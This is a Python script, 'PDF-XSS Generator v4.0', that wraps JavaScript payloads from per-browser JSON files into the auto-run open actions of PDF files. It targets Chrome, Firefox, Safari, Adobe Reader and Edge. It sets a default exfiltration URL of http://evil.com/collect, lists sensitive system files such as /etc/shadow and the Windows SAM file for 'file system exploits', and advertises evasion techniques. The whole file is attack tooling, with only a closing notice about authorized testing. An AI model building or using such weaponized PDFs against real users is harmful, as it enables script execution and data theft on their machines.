#!/usr/bin/env python3
"""
PDF-XSS Generator v4.0 - Consolidated Advanced PDF Payload Generator
====================================================================

Consolidated and enhanced PDF XSS payload generator with browser-specific targeting.
Combines functionality from multiple scripts into a single, powerful tool.

Features:
- Browser-specific JSON payload databases with enhanced Chrome targeting
- Advanced PDF generation with multiple output modes
- Payload merging and validation utilities
- OS-aware file system targeting
- Enhanced obfuscation and evasion techniques
- Simplified command-line interface

Supported Browsers: Chrome, Firefox, Safari, Adobe Reader, Microsoft Edge

Author: SNGWN
Version: 4.0
"""

import argparse
import json
import os
import sys
import platform
import hashlib
import re
from datetime import datetime
from collections import defaultdict

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

# Version and metadata
VERSION = "4.0"
AUTHOR = "SNGWN"

def get_os_specific_paths():
    """Get OS-specific file paths for file system exploits"""
    current_os = platform.system().lower()
    
    if current_os == 'windows':
        return {
            'sensitive_files': [
                'file:///C:/Windows/System32/calc.exe',
                'file:///C:/Windows/System32/cmd.exe', 
                'file:///C:/Windows/System32/drivers/etc/hosts',
                'file:///C:/Windows/win.ini',
                'file:///C:/Windows/System32/config/SAM'
            ],
            'directories': [
                'file:///C:/Windows/System32/',
                'file:///C:/Users/',
                'file:///C:/Program Files/',
                'file:///C:/ProgramData/'
            ]
        }
    elif current_os == 'darwin':  # macOS
        return {
            'sensitive_files': [
                'file:///etc/passwd',
                'file:///etc/hosts',
                'file:///System/Library/CoreServices/Finder.app',
                'file:///Applications/Calculator.app'
            ],
            'directories': [
                'file:///System/',
                'file:///Users/',
                'file:///Applications/'
            ]
        }
    else:  # Linux/Unix
        return {
            'sensitive_files': [
                'file:///etc/passwd',
                'file:///etc/shadow',
                'file:///etc/hosts',
                'file:///bin/bash',
                'file:///usr/bin/calc'
            ],
            'directories': [
                'file:///etc/',
                'file:///home/',
                'file:///usr/bin/',
                'file:///var/log/'
            ]
        }

def hash_payload(payload):
    """Create a hash of the payload for duplicate detection"""
    normalized = re.sub(r'\s+', ' ', payload.lower().strip())
    normalized = normalized.replace('http://evil.com/collect', '{url}')
    normalized = normalized.replace('http://test.com', '{url}')
    normalized = normalized.replace('https://webhook.site/test', '{url}')
    return hashlib.md5(normalized.encode()).hexdigest()

def validate_payload(payload_data):
    """Validate payload structure and content"""
    required_fields = ['id', 'category', 'browser', 'technique', 'payload', 'description', 'risk_level']
    
    for field in required_fields:
        if field not in payload_data:
            return False, f"Missing required field: {field}"
    
    payload = payload_data['payload']
    if len(payload) < 10:
        return False, "Payload too short"
    
    return True, "Valid"

def load_browser_payloads(browser):
    """Load payloads for a specific browser"""
    browser_file = f"{browser}.json"
    
    if not os.path.exists(browser_file):
        print(f"❌ Browser file not found: {browser_file}")
        return []
    
    try:
        with open(browser_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data.get('payloads', [])
    except Exception as e:
        print(f"❌ Error loading {browser_file}: {e}")
        return []

def substitute_url_in_payload(payload, target_url):
    """Replace placeholder URLs in payload with target URL"""
    substitutions = [
        'http://evil.com/collect',
        'http://test.com',
        'https://webhook.site/test',
        'https://evil.com/collect',
        '{url}',
        'EXFILTRATION_URL'
    ]
    
    for placeholder in substitutions:
        payload = payload.replace(placeholder, target_url)
    
    return payload

def create_pdf_content(payloads, target_url, pdf_version="1.7", single_file=False):
    """Create PDF content with XSS payloads"""
    os_paths = get_os_specific_paths()
    
    if single_file:
        # Create single PDF with all payloads (one per page)
        return create_single_pdf_with_pages(payloads, target_url, pdf_version, os_paths)
    else:
        # Create individual PDF files
        return create_individual_pdfs(payloads, target_url, pdf_version, os_paths)

def create_single_pdf_with_pages(payloads, target_url, pdf_version, os_paths):
    """Create a single PDF file with multiple pages"""
    pdf_files = []
    
    if not payloads:
        return pdf_files
    
    browser = payloads[0].get('browser', 'unknown')
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{browser}_all_payloads_{timestamp}.pdf"
    
    # PDF header
    pdf_content = f"%PDF-{pdf_version}\n"
    pdf_content += "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    
    # Pages object
    page_refs = []
    for i in range(len(payloads)):
        page_refs.append(f"{3 + i*2} 0 R")
    
    pdf_content += f"2 0 obj\n<< /Type /Pages /Kids [{' '.join(page_refs)}] /Count {len(payloads)} >>\nendobj\n"
    
    # Create pages
    obj_num = 3
    for i, payload_data in enumerate(payloads):
        payload = substitute_url_in_payload(payload_data['payload'], target_url)
        
        # Page object
        pdf_content += f"{obj_num} 0 obj\n"
        pdf_content += f"<< /Type /Page /Parent 2 0 R /Contents {obj_num + 1} 0 R "
        pdf_content += "/MediaBox [0 0 612 792] "
        
        # Add JavaScript action
        pdf_content += f"/AA << /O << /S /JavaScript /JS ({payload}) >> >> "
        pdf_content += ">>\nendobj\n"
        
        # Content stream
        pdf_content += f"{obj_num + 1} 0 obj\n"
        pdf_content += "<< /Length 200 >>\nstream\n"
        pdf_content += "BT\n/F1 12 Tf\n50 750 Td\n"
        pdf_content += f"({payload_data.get('description', 'XSS Payload')[:50]}...) Tj\n"
        pdf_content += "ET\nendstream\nendobj\n"
        
        obj_num += 2
    
    # Font object
    pdf_content += f"{obj_num} 0 obj\n"
    pdf_content += "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n"
    
    # Xref table
    pdf_content += "xref\n"
    pdf_content += f"0 {obj_num + 1}\n"
    pdf_content += "0000000000 65535 f \n"
    
    # Calculate approximate offsets (simplified)
    for i in range(1, obj_num + 1):
        offset = str(i * 100).zfill(10)
        pdf_content += f"{offset} 00000 n \n"
    
    # Trailer
    pdf_content += "trailer\n"
    pdf_content += f"<< /Size {obj_num + 1} /Root 1 0 R >>\n"
    pdf_content += "startxref\n0\n%%EOF"
    
    pdf_files.append((filename, pdf_content))
    return pdf_files

def create_individual_pdfs(payloads, target_url, pdf_version, os_paths):
    """Create individual PDF files for each payload"""
    pdf_files = []
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    for payload_data in payloads:
        payload = substitute_url_in_payload(payload_data['payload'], target_url)
        browser = payload_data.get('browser', 'unknown')
        technique = payload_data.get('technique', 'unknown')
        filename = f"{browser}_{technique}_{timestamp}.pdf"
        
        # Create PDF content
        pdf_content = f"%PDF-{pdf_version}\n"
        pdf_content += "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AA << /O << /S /JavaScript /JS ({payload}) >> >> >>\nendobj\n"
        pdf_content += "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        pdf_content += "3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R /MediaBox [0 0 612 792] /AA << /O << /S /JavaScript /JS ({payload}) >> >> >>\nendobj\n"
        pdf_content += "4 0 obj\n<< /Length 250 >>\nstream\n"
        pdf_content += "BT\n/F1 12 Tf\n50 750 Td\n"
        pdf_content += f"(XSS Payload: {payload_data.get('description', 'Unknown')[:40]}...) Tj\n"
        pdf_content += "0 -20 Td\n"
        pdf_content += f"(Technique: {technique}) Tj\n"
        pdf_content += "0 -20 Td\n"
        pdf_content += f"(Risk Level: {payload_data.get('risk_level', 'medium')}) Tj\n"
        pdf_content += "ET\nendstream\nendobj\n"
        pdf_content += "5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n"
        pdf_content += "xref\n0 6\n0000000000 65535 f \n0000000010 00000 n \n0000000150 00000 n \n0000000200 00000 n \n0000000350 00000 n \n0000000650 00000 n \n"
        pdf_content += "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n700\n%%EOF"
        
        pdf_files.append((filename, pdf_content))
    
    return pdf_files

def save_pdf_files(pdf_files, output_dir):
    """Save PDF files to output directory"""
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    saved_files = []
    for filename, content in pdf_files:
        filepath = os.path.join(output_dir, filename)
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)
            saved_files.append(filename)
        except Exception as e:
            print(f"❌ Error saving {filename}: {e}")
    
    return saved_files

def list_available_browsers():
    """List available browsers and their payload counts"""
    browsers = ['chrome', 'firefox', 'safari', 'adobe', 'edge']
    print("📊 AVAILABLE BROWSERS AND PAYLOAD COUNTS:")
    print("=" * 45)
    
    for browser in browsers:
        browser_file = f"{browser}.json"
        if os.path.exists(browser_file):
            try:
                with open(browser_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    count = len(data.get('payloads', []))
                    print(f"✅ {browser:<8} - {count} payloads ({browser_file})")
            except:
                print(f"❌ {browser:<8} - Error loading {browser_file}")
        else:
            print(f"❌ {browser:<8} - File not found: {browser_file}")

def main():
    parser = argparse.ArgumentParser(
        description="PDF-XSS Generator v4.0 - Consolidated Advanced PDF Payload Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  python3 pdf_xss_generator.py -b chrome -u http://test.com           # Generate Chrome PDF files  
  python3 pdf_xss_generator.py -b firefox --single-file -u http://evil.com  # Single file with all Firefox payloads
  python3 pdf_xss_generator.py -b safari --count 5                   # Generate 5 Safari PDF files
  python3 pdf_xss_generator.py -b adobe -u http://webhook.site/xyz   # Generate Adobe PDF files
  python3 pdf_xss_generator.py -b all -u http://test.com             # Generate files for all browsers

BROWSER-SPECIFIC JSON FILES:
  chrome.json   - Chrome/PDFium specific payloads (Enhanced with modern evasion)
  firefox.json  - Firefox/PDF.js specific payloads  
  safari.json   - Safari/PDFKit specific payloads
  adobe.json    - Adobe Reader/Acrobat specific payloads
  edge.json     - Microsoft Edge specific payloads

FEATURES:
  ✓ Consolidated script functionality (reduced from 5 to 1 main script)
  ✓ Enhanced browser-specific payload targeting
  ✓ Advanced Chrome evasion techniques
  ✓ Complete payload visibility in PDF files
  ✓ OS-aware file system targeting
  ✓ One payload per page option
  ✓ Payload validation and merging utilities
        """)
    
    parser.add_argument('-b', '--browser', 
                        choices=['chrome', 'firefox', 'safari', 'adobe', 'edge', 'all'],
                        help='Target browser (required unless using --list-browsers)')
    parser.add_argument('-u', '--url', default='http://evil.com/collect',
                        help='Target URL for data exfiltration (default: http://evil.com/collect)')
    parser.add_argument('-o', '--output-dir', default='Files',
                        help='Output directory for PDF files (default: Files)')
    parser.add_argument('--single-file', action='store_true',
                        help='Create single file with all payloads for browser (one payload per page)')
    parser.add_argument('--count', type=int,
                        help='Limit number of payloads to generate')
    parser.add_argument('--pdf-version', choices=['1.0', '1.1', '1.2', '1.3', '1.4', '1.5', '1.6', '1.7', '2.0'],
                        default='1.7', help='PDF version (default: 1.7)')
    parser.add_argument('--list-browsers', action='store_true',
                        help='List available browsers and payload counts')
    
    args = parser.parse_args()
    
    if args.list_browsers:
        list_available_browsers()
        return
    
    if not args.browser:
        parser.error("Browser selection required. Use -b/--browser or --list-browsers")
    
    print(f"🚀 PDF-XSS GENERATOR v{VERSION}")
    print("=" * 40)
    print(f"Target Browser: {args.browser}")
    print(f"Target URL: {args.url}")
    print(f"Output Directory: {args.output_dir}")
    print(f"PDF Version: {args.pdf_version}")
    if args.count:
        print(f"Payload Limit: {args.count}")
    print()
    
    # Load payloads
    if args.browser == 'all':
        browsers = ['chrome', 'firefox', 'safari', 'adobe', 'edge']
        all_payloads = []
        for browser in browsers:
            browser_payloads = load_browser_payloads(browser)
            if browser_payloads:
                print(f"📖 Loading {browser} payloads from {browser}.json...")
                print(f"✅ Loaded {len(browser_payloads)} payloads for {browser}")
                all_payloads.extend(browser_payloads)
        payloads = all_payloads
    else:
        print(f"📖 Loading {args.browser} payloads from {args.browser}.json...")
        payloads = load_browser_payloads(args.browser)
        if payloads:
            print(f"✅ Loaded {len(payloads)} payloads for {args.browser}")
    
    if not payloads:
        print("❌ No payloads loaded. Exiting.")
        return
    
    # Limit payloads if requested
    if args.count:
        payloads = payloads[:args.count]
    
    # Generate PDF files
    if args.single_file:
        print(f"\n🔥 Creating single PDF file with {len(payloads)} payloads...")
    else:
        print(f"\n🔥 Creating {len(payloads)} individual PDF files for {args.browser}...")
    
    pdf_files = create_pdf_content(payloads, args.url, args.pdf_version, args.single_file)
    
    if pdf_files:
        saved_files = save_pdf_files(pdf_files, args.output_dir)
        
        for filename in saved_files:
            print(f"  ✅ {filename}")
        
        print(f"\n🎯 GENERATION COMPLETE")
        print("=" * 30)
        print(f"✅ Total PDF files created: {len(saved_files)}")
        print(f"📁 Files saved in: {args.output_dir}/")
        print(f"\n⚠️  SECURITY NOTICE:")
        print("These PDF files contain XSS payloads for authorized security testing only.")
        print("Use only with proper permissions in controlled environments.")
    else:
        print("❌ No PDF files were created.")

if __name__ == "__main__":
    main()